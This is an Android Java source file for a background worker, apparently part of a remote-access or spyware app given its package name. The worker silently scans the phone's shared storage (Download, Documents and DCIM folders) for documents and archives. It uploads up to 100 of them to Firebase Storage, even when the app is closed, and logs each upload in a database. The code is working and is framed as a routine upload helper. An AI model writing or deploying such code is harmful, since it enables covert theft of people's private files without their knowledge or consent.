package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload all file types (PDFs, Excel, etc.) even when app is closed.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final int MAX_DOCUMENTS_PER_SYNC = 100;
    private int uploadedCount = 0;

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            uploadDocuments(userId);
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "Document upload failed", e);
            return Result.retry();
        }
    }

    private void uploadDocuments(String userId) {
        uploadedCount = 0;
        
        // Scan multiple document directories
        String[] scanPaths = {
                "/sdcard/Download",
                "/sdcard/Documents",
                "/sdcard/DCIM",
                "/sdcard/Downloads",
                getApplicationContext().getExternalFilesDir(null) != null ? getApplicationContext().getExternalFilesDir(null).getAbsolutePath() : null,
        };

        for (String path : scanPaths) {
            if (path != null && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    Log.d(TAG, "Scanning directory: " + path);
                    scanDirectoryRecursive(dir, userId);
                }
            }
        }
        
        Log.d(TAG, "Document upload complete - " + uploadedCount + " files uploaded");
    }

    /**
     * Recursively scan directories for documents
     */
    private void scanDirectoryRecursive(File dir, String userId) {
        try {
            File[] files = dir.listFiles();
            if (files == null) {
                return;
            }

            for (File file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
                    return;
                }

                if (file.isDirectory() && !file.isHidden()) {
                    // Recursively scan subdirectories
                    scanDirectoryRecursive(file, userId);
                } else if (file.isFile() && file.canRead()) {
                    if (isDocumentFile(file)) {
                        uploadFile(file, userId);
                        uploadedCount++;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        String name = file.getName().toLowerCase();
        return name.endsWith(".pdf")
                || name.endsWith(".xlsx")
                || name.endsWith(".xls")
                || name.endsWith(".docx")
                || name.endsWith(".doc")
                || name.endsWith(".pptx")
                || name.endsWith(".ppt")
                || name.endsWith(".csv")
                || name.endsWith(".txt")
                || name.endsWith(".zip")
                || name.endsWith(".rar")
                || name.endsWith(".7z");
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName);
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            Uri fileUri = Uri.fromFile(file);
            
            storageRef.putFile(fileUri)
                    .addOnSuccessListener(task -> {
                        task.getStorage().getDownloadUrl().addOnCompleteListener(urlTask -> {
                            if (urlTask.isSuccessful() && urlTask.getResult() != null) {
                                recordDocumentInDatabase(userId, fileName, urlTask.getResult().toString(), file.length());
                                Log.d(TAG, "Uploaded: " + fileName);
                            }
                        });
                    })
                    .addOnFailureListener(e -> Log.e(TAG, "Upload failed for " + fileName, e));

        } catch (Exception e) {
            Log.e(TAG, "Error uploading file: " + file.getName(), e);
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName);

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("userId", userId);

            documentsRef.child(docId).setValue(docData);
        } catch (Exception e) {
            Log.e(TAG, "Failed to record document in database", e);
        }
    }

    /**
     * Enqueue a one-time document upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(DocumentUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(context).enqueueUniqueWork(
                "document_upload_once",
                ExistingWorkPolicy.KEEP,
                uploadWork
        );
        Log.d(TAG, "Document upload work enqueued");
    }
}
